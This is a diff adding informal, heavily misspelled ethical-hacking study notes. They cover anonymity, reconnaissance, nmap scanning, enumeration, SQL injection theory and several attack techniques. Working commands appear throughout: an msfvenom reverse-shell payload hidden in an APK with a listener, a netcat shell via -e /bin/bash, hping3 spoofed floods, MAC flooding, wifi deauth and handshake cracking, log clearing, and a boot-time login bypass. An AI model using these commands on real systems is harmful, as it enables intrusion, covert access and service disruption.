@@ -1,0 +1,298 @@
+''''''''''''''''''''''''''''''''''''RK notes''''''''''''''''''''''''''''''''''''''
+
+1  -  Be anonymous
+
+	1 - Change host name -
+	    $ gedit etc/hostname flie 
+   
+	2 - configure proxy - 
+	    $ gedit /etc/proxychanin_config - 
+	      follow dynamic chain method and add some proxy by google 
+	      
+	      for texting whether ip are switch or not
+	    $ proxychain curl [url]
+	    
+	    another way is by using tor ghost from github
+	    
+	3 - using vpn
+	 vpn is less secure then proxy because vpn has dns leak by which we can check whether user use a vpn or not 
+	 search vpn text and dns leak to text
+	 
+	4 - change mac address
+	 ethernet
+	  by using macchanger
+	   change mac whenever syster start using crom tab
+	 wifi stich
+	  $ ifconfig wlan0 donw
+	  $ ifconfig wlan0 hw ether [ip]
+	  
+2  -  Footprinting 
+	- first step of ethical hacking
+	- fp is all about gathering information of personal detain, company detail, system detail,gathering all information about target,
+	  entitis belong to target and technology.
+	- it is use to gather information, easy processing, time saving and acurate targeting.
+	
+	- fp through search engin
+	 - not evil
+	 - shodan 
+	 - censys
+	 - duck duck go
+	 - google advance search like index of pages 
+	
+	- other ways 
+	 - knoweing website tech (netcraft and wappylyzer ex)
+	 - sub domain of website (sublist3r and subdimain finder)
+	 - finding hiddden link (link extractor and DIRD)
+	 - security of header (securityheader.com)
+	 - ip and buffer size 
+	   - find ip by domin 
+	     - $ ping [domain]
+	   - find buffer size 
+	     - ping -f -l 4500 [domain]
+	     -f to do not fragement 
+	     -l length of fragment 
+	 - ssl text (ssllabs.com and ssltext)
+	 - wayback machine to know the past look of website
+	 - checking spf record
+	 
+	- DNS fp 
+	 - by nx and mx lookup tools and git discover 
+
+3  -  Network scanning
+	- is a process of scanning of active devices for their open ports and their miss configuration
+	
+	- methodology
+	 - selecting target
+	 - scan for ip range 
+	 - scan for open ports
+	 - checking servises 
+	 - grabing versiion
+	 - grabing os 
+	 - bypass ids 
+	 - selecting correct scan
+	 
+	-NMAP
+	 - for TCP $ nmap -sT [ip]
+	 - for UDP $ nmap -sU 
+	 - for syn $ nmap -sS for fooling ids by not extablishing connection and just send syn packet and receive ack but didn't send ack 
+	 - $ nmap -sT -T4 -sV -p 0-62555 -v [ip] --script
+	  - -sT for TCP scan
+	  - -t4 for tcp level higest level
+	  - -sV show verion of ports ans their runing service
+	  - -p ports for scan range
+	 - we can use masscan for large network it work faster on larger n/w.
+	 
+4  -  Enumaratioin
+	- find missconfiguration on protocols use for data tranrsfer 
+	- with the help of enumararion we can get
+	 - username, email id
+	 - brute force active direcotry 
+	 - user group - window
+	 - default pass and dns zone transfer
+	 - window has a null account other than guest account which doesn't has any pass and username which is used to transfer file btw two devices  
+	- SMTP 
+	- netBIOS
+	- NFS - we can access the file of a victim computer, worked on port 111, so check is this port is open or not
+	- DNS $ dnsenum [domain] to get to know whether zone transfer is possible or not
+	- find these ports are open or not by n/w scanning if open then we can enter into them and control them
+
+
+5  -  vulnerabilities assessment
+	- is a systamatic process of review security weekneess of gathered data and assign secrurity level to how easily it can be attacked
+	- classification of valnurabilities 
+	 - missconfiguration 
+	 - default instalation
+	 - buffer overflow - if buffer overflow system start missbehaving
+	 - unpatched server - server which has vulnerabilities but not yet repaired 
+	 - desing flaw 
+	 - os flaws - update of os come because there is something in previous version, iff system run on previous version then it is more easy to get victim
+	 - open services flaws - open ports by which any one can enter into our machine
+	 - application flaws - like sql injection
+	 - default password 
+	 
+	- vulnerabilities scoring system - can check on cvss website for bug bounting
+	- exploit database - any bug, vulnerabilities, virus ,trozen, paylod and anything is reported is showen here
+	- zap appl and nessus- can scam the entire network amd report all the vulnerabilities in it
+	
+6  -  System hacking
+	it is a process of gaining access of target computer and control it from our side
+	methodology of system hacking 
+	- gain all information through 
+	 - footprinting
+	 - scanning 
+	 - enumuration 
+	 - ulnerabilities assessment
+	 
+	- perform this step to gain access
+	 - creaking password
+	 - exculating privilage - gaining administrative permission to excaute file
+	 - excaute application - deploy some application by which we can have lifetime access of target computer
+	 - hiding file - hide all file so user cann't delete them
+	 - clearing logs or tracks - removing our footprinting so user cannot follow back and revert our step
+	 
+	- bypass login windown in linux
+	 - during bootup press e and on editible menu change ro to rw init=bin/bash
+	  - by this we can directly assess the terminul and do all the thing 
+	- bypass login window in window 
+	 - create boottable pendrive of trails os
+	 - boot it online without installing 
+	 - by using this we can ascess all drive 
+	 
+	 - stepnography 
+	  hideing information in back of other file like audio image video word folder etc.
+	  - we can perform it by using openstegno and other similar tools available on net.
+	  
+	 - clearlogs
+	   - by using software clearlog.exe
+	   - by deleting content on file var/log/messages
+	  
+	 - creating paylod
+	  - $ msfvenom -l paylod to display all paylods 
+	  - $ msfvenom -p [paylod name] LHOST=[our ip] LPORT=[random port] > [apk name.apk]
+	  - we can use encoding to prevent it form identify
+	  - we can also inject the paylod into another apk like flappy bird game by using -x [name]
+	  - now to listen the port we have to configure the paylod
+	  - $ msfconsole 
+	  - $ use exploit/multi/handler
+	  - $ set paylod [name] amd set LHOST [ip] and set LPORT [port]
+	  - $ show option
+	  - $ run
+	  
+	 - sniffing 
+	  - monitoring the network what come and goes 
+	  - captureing what monitors
+	  - data packet - data transfer in packet and we capture those packet
+	  - access entire netwoek trqfic
+	  - gather sensitive information like packet may contain username and password
+	  
+	 - spoffing 
+	  - mac spoffing - change our mac address to victim mac address same with ip in shoort gaining access of victim machine  
+	   - by using $ netdiscover command we can get list of all connected n/w and then copy victim mac and by using machanger we can change our mac to victim mac
+	  - flooding - sending too much mac addresss so mac table of router get full and not able to add more entries
+	   - by using macof -i [interface name] -d [destination ip or router ip] -n [count]
+	 
+	 - DHCP and man in the middle attack
+	  - by using $ apt get install yersinia
+	  - we use graphical version of it by using -g
+	  - then we can take work of dhcp of router and assign it to our system so after that our systen work as a dhcp server and now we can manage and monior the 
+	    trafic 
+	  - for monitoring the request we can use white shark application and thss is mitm attack
+	 
+	 - social engineering
+	  - if system is secure then we try to make human to do mistake by appeleaing him to click on the link and other thing
+	  - can use socail engineering tool
+	  
+	 - Dos and DDos attack
+	  - Dos denial of service attack by flooding
+	  - DDos destributed denial of service attack by doing flooding by many zombie host
+	  - by using hping3 s [victim ip] -a [attacker ip] --flood
+
+	 - Session hijacking
+	  - Session hijacking is a technique used by hackers to gain access to a target’s computer or online accounts.
+	    In a session hijacking attack, a hacker takes control of a user’s browsing session to gain access to their
+	    personal information and passwords.
+	  - Because http communication uses many different TCP connections, the web server needs a method to recognize every user’s connections. 
+	    The most useful method depends on a token that the Web Server sends to the client browser after a successful client authentication.
+	    A session token is normally composed of a string of variable width and it could be used in different ways, like in the URL,
+	    in the header of the http requisition as a cookie, in other parts of the header of the http request, or yet in the body of the http requisition. 
+	  - The Session Hijacking attack compromises the session token by stealing or predicting a valid session token to gain unauthorized access to the Web Server
+	  - Why it is so successful
+	   - invalid session id does not lock our account means we can do a brute force attack
+ 	   - week session id generation algorithm
+	   - session timeout not present on most of conncetion
+	  - session hijacking process
+	   - sniffing - gathering the data
+	   - monitering - analysing the data
+	   - session desyncronization - removing the access of original person connection
+	   - session id prdection by capturing the few number of id and analyze the differernces detween them to predict the algo
+	  - session h in osi model
+	   - in network layer interceptioin of packet during the transsmission like in wifi password 
+	   - in application laye	  
+	  - by using brupsuite we can intersepte any request come and out from our browser and we can even intersepte and make chnages in response and request
+
+	 - wifi hacking
+	  - first change mode to monitor mode
+	   - $ iwconfig [name of stick or wifi hardware] down 
+	   - $ iwconfig wlan[stick number] mode monitor
+	   - and up the wifi stick
+	   - now we are ready to know all the transistion
+	    - $ airodump-ng wlan[] 
+	    - chose which one you want to hack
+	    - now by $ airodump-ng --bbsid [id ] --channel [] --write [name of file where to store gather information]
+	    - now we have to disconnect the use by using $ aireplay-ng --deauth [no of packet] -a[user mac address whom we have to dissconnect]
+ 	     - -c[wifi mac address inshort bbsid] wlan[number]
+	     - now to crack the handshake file we can use aircreacker-ng [file name] -w [wordlist path]
+
+7  -  penetratioin testing
+	A penetration test (pen test) is an authorized simulated attack performed on a computer system to evaluate its security. 
+	Penetration testers use the same tools, techniques, and processes as attackers to find and demonstrate the business impacts of weaknesses in a system.
+	Penetration tests usually simulate a variety of attacks that could threaten a business. 
+	They can examine whether a system is robust enough to withstand attacks from authenticated and unauthenticated positions, as well as a range of system roles.
+	With the right scope, a pen test can dive into any aspect of a system.
+	
+	- Advance information gathering	 
+	 - subdomain - developer mainly focous on main domain where trafic is high and not on subdomain where we can find val. and also can access the main domain DB
+	 - wolframealpha is a website where we can find subdomain with daily users
+	
+	- Port forwading
+	 - to open a port on our public ip so any one come on our ip with open port can directly connect to our local system
+	 - To take our system global we can use fort forwading and use that ip and port number insted of localhost ip and port	
+	 - we cam do this by using ngrock first install ngrock 
+	 - unzip it by using unzip [file name]   
+	 - follow some step on website 
+	 - open port by using $ service apace2 start than go to cd /var/www/html
+	 - but still only the lan computer can access the file on html but not by wan
+	 - so to make it available on wan we use port forwading
+	 - run ngrok by $ ./ngrock [protocol like http] [port] same as which is open by apache
+	
+	- netcat
+	 - it is used to scan open ports and open a port on any machine and that machine act as server
+	  and other can connect with that open port
+	 - to scan a port $ nc -nvz [ip] and range like 1-100
+	 - and to conncet with that open port $ nc -nv [ip] [port]
+	- to open a port intansially use $ nc -nvlp [port] 
+		-v verbiously -l lissten -p port
+
+	- hwo to send a file using ncat
+	 - use $ nc -nvlp [port] > [path of file]
+		now any one 
+	  - to acces that file
+		$ nc -nv [ip ] [port] < [file name where we want to save file]
+	 - insted of file we can share entire cmd by using -e cmd.exe and kali terminal by share /bin/bash/
+
+	- access camera of victim machine by sencing link
+	 - use camphis from github and follow the installation step 
+	 - it automatically use port forwading for working in WAN
+
+	- osint framework is a website help us for information gathering in step by step manner and which tool we should use to do that
+	      
+	- Burpsuit 
+	 - to intersect the request on webpage and check all its perimeters and even we can modify them too
+	 - we can use it as while adding product to chart, before adding we can change the price or quantity of product and some status code like payment stause we can modify it 
+	 - to work with burpsuit so it can intersect the browser request, set broweser proxy to local system, so our burpsuit can interect with it
+	 - we also have to install certificate from burpsuit website httm://burp
+     
+	- What is SQL injection
+	- SQL injection, also known as SQLI, is a common attack vector that uses malicious SQL code for backend database manipulation to access information that was not intended to be displayed. 
+	  This information may include any number of items, including sensitive company data, user lists or private customer details.
+
+	- Types of SQL Injections
+	 - SQL injections typically fall under three categories: In-band SQLi (Classic), Inferential SQLi (Blind) and Out-of-band SQLi. You can classify SQL injections types based on the methods they use to access backend data and their damage potential.
+
+	- In-band SQLi
+	 - The attacker uses the same channel of communication to launch their attacks and to gather their results. In-band SQLi’s simplicity and efficiency make it one of the most common types of SQLi attack. There are two sub-variations of this method:
+		- Error-based - SQLi—the attacker performs actions that cause the database to produce error messages. The attacker can potentially use the data provided by these error messages to gather information about the structure of the database.
+		- Union-based - SQLi—this technique takes advantage of the UNION SQL operator, which fuses multiple select statements generated by the database to get a single HTTP response. This response may contain data that can be leveraged by the attacker.
+
+	- Inferential (Blind) SQLi
+	 - The attacker sends data payloads to the server and observes the response and behavior of the server to learn more about its structure. This method is called blind SQLi because the data is not transferred from the website database to the attacker,
+	   thus the attacker cannot see information about the attack in-band.	
+	 -Blind SQL injections rely on the response and behavioral patterns of the server so they are typically slower to execute but may be just as harmful. Blind SQL injections can be classified as follows:
+
+		- Boolean — that attacker sends a SQL query to the database prompting the application to return a result. The result will vary depending on whether the query is true or false. Based on the result, the information within the HTTP response will modify or stay unchanged.
+		 The attacker can then work out if the message generated a true or false result.
+		- Time-based — attacker sends a SQL query to the database, which makes the database wait (for a period in seconds) before it can react. The attacker can see from the time the database takes to respond, whether a query is true or false. Based on the result, 
+		  an HTTP response will be generated instantly or after a waiting period. The attacker can thus work out if the message they used returned true or false, without relying on data from the database.
+	- Out-of-band SQLi
+	 - The attacker can only carry out this form of attack when certain features are enabled on the database server used by the web application. This form of attack is primarily used as an alternative to the in-band and inferential SQLi techniques.
+	 - Out-of-band SQLi is performed when the attacker can’t use the same channel to launch the attack and gather information, or when a server is too slow or unstable for these actions to be performed. These techniques count on the capacity of the server to create DNS or HTTP requests to transfer data to an attacker.	
